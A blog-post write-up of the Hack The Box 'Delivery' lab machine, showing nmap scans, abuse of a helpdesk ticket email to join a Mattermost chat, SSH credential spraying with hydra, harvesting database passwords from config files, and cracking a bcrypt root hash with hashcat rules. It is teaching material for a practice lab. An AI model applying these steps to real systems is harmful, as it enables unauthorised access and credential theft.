<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Delivery Write-Up | The Cyber Experiment</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Delivery Write-Up" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This is my writeup of the Delivery machine on Hack The Box. This box was created by one of my favourite youtubers: Ippsec (If you don’t know him, check his videos). I tricked two different application into talking to each other in order to obtain my initial foothold on the machine. Local enumeration reveals a hashed credential that I cracked using a rule based hashcat attack to get root-level privileges." />
<meta property="og:description" content="This is my writeup of the Delivery machine on Hack The Box. This box was created by one of my favourite youtubers: Ippsec (If you don’t know him, check his videos). I tricked two different application into talking to each other in order to obtain my initial foothold on the machine. Local enumeration reveals a hashed credential that I cracked using a rule based hashcat attack to get root-level privileges." />
<link rel="canonical" href="/htb/delivery-write-up" />
<meta property="og:url" content="/htb/delivery-write-up" />
<meta property="og:site_name" content="The Cyber Experiment" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-03-26T23:48:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Delivery Write-Up" />
<script type="application/ld+json">
{"headline":"Delivery Write-Up","dateModified":"2021-03-26T23:48:00+01:00","datePublished":"2021-03-26T23:48:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/delivery-write-up"},"url":"/htb/delivery-write-up","description":"This is my writeup of the Delivery machine on Hack The Box. This box was created by one of my favourite youtubers: Ippsec (If you don’t know him, check his videos). I tricked two different application into talking to each other in order to obtain my initial foothold on the machine. Local enumeration reveals a hashed credential that I cracked using a rule based hashcat attack to get root-level privileges.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="The Cyber Experiment" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">The Cyber Experiment</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Delivery Write-Up</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2021-03-26T23:48:00+01:00" itemprop="datePublished">Mar 26, 2021
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This is my writeup of the Delivery machine on Hack The Box. This box was created by one of my favourite youtubers: Ippsec (If you don’t know him, check his <a href="ippsec-yt">videos</a>). I tricked two different application into talking to each other in order to obtain my initial foothold on the machine. Local enumeration reveals a hashed credential that I cracked using a rule based hashcat attack to get root-level privileges.</p>

<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
<p>An initial nmap scan of the host shows Nginx running on port 80. A quick Google search does not list any interesting vulnerabilities for this particular version. Also, SSH seems to be up to date. So lets run a full TCP scan using nmap in the background, and start enumerating the web application.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-O</span> 10.10.10.222

Nmap scan report <span class="k">for </span>10.10.10.222 <span class="o">(</span>10.10.10.222<span class="o">)</span>
Host is up <span class="o">(</span>0.022s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 <span class="o">(</span>RSA<span class="o">)</span>
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome

Network Distance: 2 hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p>Below are the results of the full TCP scan. The scan shows that port 8065 is also open and seems to be running HTTP based on the responses it gives. I will reference theses results later on.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Sat Mar 27 04:36:28 2021 as: nmap -sV -sC -n -p- -oN /tmp/full-tcp 10.10.10.222</span>
Nmap scan report <span class="k">for </span>10.10.10.222
Host is up <span class="o">(</span>0.021s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 <span class="o">(</span>RSA<span class="o">)</span>
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
<span class="o">[</span>...snip...]
</code></pre></div></div>

<h2 id="enumerating-the-web-application">Enumerating the Web Application</h2>
<p>Before doing anything I quickly browse around on the website and find two interesting things. First of their is a <code class="language-plaintext highlighter-rouge">/#contact-us</code> page that states that users with a <code class="language-plaintext highlighter-rouge">@delivery.htb</code> email address can access their MatterMost server (which links to <code class="language-plaintext highlighter-rouge">delivery.htb:8065</code>). Secondly we find a link to the sub domain <code class="language-plaintext highlighter-rouge">helpdesk.delivery.htb</code>. So I add those entries to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and will first have a look at the helpdesk page.</p>

<p><img src="/assets/htb/delivery/contact-us.png" alt="Screenshot of the /#contact-us page" />
<em>The contact-us page revealing the helpdesk and MatterMost services</em></p>

<h2 id="enumerating-the-helpdesk">Enumerating the Helpdesk</h2>
<p>On the help desk page I can create a new ticket. During the process a <code class="language-plaintext highlighter-rouge">&lt;ticket-id&gt;@delivery.htb</code> email address is generated with the instructions that any email send to that email address will have its contents attached to the ticket. In other words, the inbox of the email address will be attached to my ticket. And I can view my ticket by going to the <code class="language-plaintext highlighter-rouge">helpdesk.delivery.htb/view.php</code> page.</p>

<p>From before I know that I need an <code class="language-plaintext highlighter-rouge">@delivery.htb</code> email address to register for the MatterMost service. MatterMost is like slack and may thus contain sensitive information</p>

<h2 id="enumerating-the-mattermost">Enumerating the MatterMost</h2>

<p>I create an account using the email address of my ticket. After creating the account it asks to verify our email address. So I go and check the status of my ticket to find the activation email and activate my account.</p>

<p><img src="/assets/htb/delivery/verification-email-ticket.png" alt="activation email attached to the ticket" />
<em>The email with the verification link is attached to the ticket.</em></p>

<p>Using my new account I log into the MatterMost service and find that I can read an internal chat. The internal chat contains three usernames, and a password:</p>
<ol>
  <li>root</li>
  <li>developers</li>
  <li>maildeliverer: Youve_G0t_Mail!</li>
</ol>

<p>The chat also contains a message about them reusing the same password with small variations each time: <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code>. The chat message mentions that the credentials can be used on the helpdesk system at <code class="language-plaintext highlighter-rouge">helpdesk.delivery.htb/scp/login.php</code>. I investigated the application but could not find anything interesting for getting a foothold on the machine.</p>

<p><img src="/assets/htb/delivery/internal-chat.jpg" alt="internal-chat" />
<em>Internal chat message containing credentials.</em></p>

<h2 id="credential-reuse">Credential Reuse</h2>
<p>From the chat message I learned that they apparently have a habit of reusing passwords everywhere. From my enumeration, I still have one port that I have not investigated yet: port 22 running SSH. Typically we should not brute force SSH, however I can safely try two passwords as lockout typically only happens after three failed attempts.</p>

<p>So I create a <code class="language-plaintext highlighter-rouge">users.txt</code> file with the three usernames and a <code class="language-plaintext highlighter-rouge">passwords.txt</code> file containing the passwords <code class="language-plaintext highlighter-rouge">Youve_G0t_Mail!</code> and <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code>. And next I configure the hydra tool to test the passwords.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> passwords.txt ssh://delivery.htb

<span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
<span class="o">[</span>DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries <span class="o">(</span>l:3/p:2<span class="o">)</span>, ~1 try per task
<span class="o">[</span>DATA] attacking ssh://delivery.htb:22/
<span class="o">[</span>22][ssh] host: delivery.htb   login: maildeliverer   password: Youve_G0t_Mail!
1 of 1 target successfully completed, 1 valid password found
</code></pre></div></div>

<p>Now I can SSH into the machine and obtain the user flag in <code class="language-plaintext highlighter-rouge">/home/maildeliverer/user.txt</code>.</p>

<h2 id="post-exploitation">Post Exploitation</h2>
<p>I first enumerate the machine using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linpeas.sh</a> but without much luck. However, as the server is running two web applications, I decided to have a look at source codes as these typically contain credentials. I first went to the <code class="language-plaintext highlighter-rouge">/var/www</code> application and used grep to look for database credentials:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>maildeliverer@Delivery:/var/www<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"DBPASS"</span> <span class="k">*</span>
osticket/upload/include/ost-sampleconfig.php:define<span class="o">(</span><span class="s1">'DBPASS'</span>,<span class="s1">'%CONFIG-DBPASS'</span><span class="o">)</span><span class="p">;</span>
osticket/upload/include/ost-config.php:define<span class="o">(</span><span class="s1">'DBPASS'</span>,<span class="s1">'!H3lpD3sk123!'</span><span class="o">)</span><span class="p">;</span>
osticket/upload/bootstrap.php:        <span class="k">if</span> <span class="o">(!</span>db_connect<span class="o">(</span>DBHOST, DBUSER, DBPASS, <span class="nv">$options</span><span class="o">))</span> <span class="o">{</span>
</code></pre></div></div>

<p>Unfortunately I did not find anything interesting in the database with these credentials. So lets look for the MatterMost application as it is not in <code class="language-plaintext highlighter-rouge">/var/www</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>maildeliverer@Delivery:/var/www<span class="nv">$ </span>find / <span class="nt">-name</span> mattermost 2&gt;/dev/null
/opt/mattermost
/opt/mattermost/bin/mattermost
/var/lib/mysql/mattermost
</code></pre></div></div>

<p>Having located the sources for the application, I cat out all the config files and find a different set of credentials for the MariaDB database.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/mattermost/config/<span class="k">*</span>
...snip...
<span class="s2">"SqlSettings"</span>: <span class="o">{</span>                                                          
    <span class="s2">"DriverName"</span>: <span class="s2">"mysql"</span>,                                                                                                                               
    <span class="s2">"DataSource"</span>: <span class="s2">"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8</span><span class="se">\u</span><span class="s2">0026readTimeout=30s</span><span class="se">\u</span><span class="s2">0026writeTimeout=30s"</span>,         
    <span class="s2">"DataSourceReplicas"</span>: <span class="o">[]</span>,                                             
    <span class="s2">"DataSourceSearchReplicas"</span>: <span class="o">[]</span>,                                                                                                                      
    <span class="s2">"MaxIdleConns"</span>: 20,                                                                                                                                  
    <span class="s2">"ConnMaxLifetimeMilliseconds"</span>: 3600000,                                                                                                              
    <span class="s2">"MaxOpenConns"</span>: 300,                                                                                                                                 
    <span class="s2">"Trace"</span>: <span class="nb">false</span>,                                                                                                                                      
    <span class="s2">"AtRestEncryptKey"</span>: <span class="s2">"n5uax3d4f919obtsp1pw1k5xetq1enez"</span>,               
    <span class="s2">"QueryTimeout"</span>: 30,                                                   
    <span class="s2">"DisableDatabaseSearch"</span>: <span class="nb">false</span>                                        
<span class="o">}</span>,    
...snip...
</code></pre></div></div>

<p>I login to the datbase again but this time usign the MariaDB credentials of the MatterMost application and then dump the Users table.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> mmuser <span class="nt">-p</span>
use mattermost<span class="p">;</span>
MariaDB <span class="o">[</span>mattermost]&gt; <span class="k">select </span>Username, Password, AuthData, Email, Roles from Users<span class="p">;</span>
+----------------------------------+--------------------------------------------------------------+----------+-------------------------+--------------------------+
| Username                         | Password                                                     | AuthData | Email                   | Roles                    |
+----------------------------------+--------------------------------------------------------------+----------+-------------------------+--------------------------+
| root                             | <span class="nv">$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL     | root@delivery.htb       | system_admin system_user |
+----------------------------------+--------------------------------------------------------------+----------+-------------------------+--------------------------+
10 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
</code></pre></div></div>

<h2 id="cracking-the-hash">Cracking the Hash</h2>
<p>From the internal chat I remember the comment by the root user about them using variants of the <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code> password everywhere. So instead of running a straight dictionary attack against the hash. I will use the password mangling capability of Hashcat to generate a targeted list of passwords that are all variants of the <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code> password. This king of attack is very effective way to attack users that reuse passwords by only introducing a little variation to a base password.</p>

<p>I identify the hash type by submitting it to a only <a href="http://tunnelsup.com/hash-analyzer">hash-analyzer</a>; It is a bcrypt hash. Next I configure Hashcat and crack the hash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200  root.hash pw.txt  <span class="nt">-r</span> /usr/share/hashcat/rules/best64.rule  
hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200  root.hash pw.txt  <span class="nt">-r</span> /usr/share/hashcat/rules/best64.rule <span class="nt">--show</span>
<span class="nv">$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
</code></pre></div></div>

<p>I <code class="language-plaintext highlighter-rouge">su</code> into the root user and obtain the flag in <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p>


  </div><a class="u-url" href="/htb/delivery-write-up" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">The Cyber Experiment</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">The Cyber Experiment</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/the-cyber-experiment"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">the-cyber-experiment</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
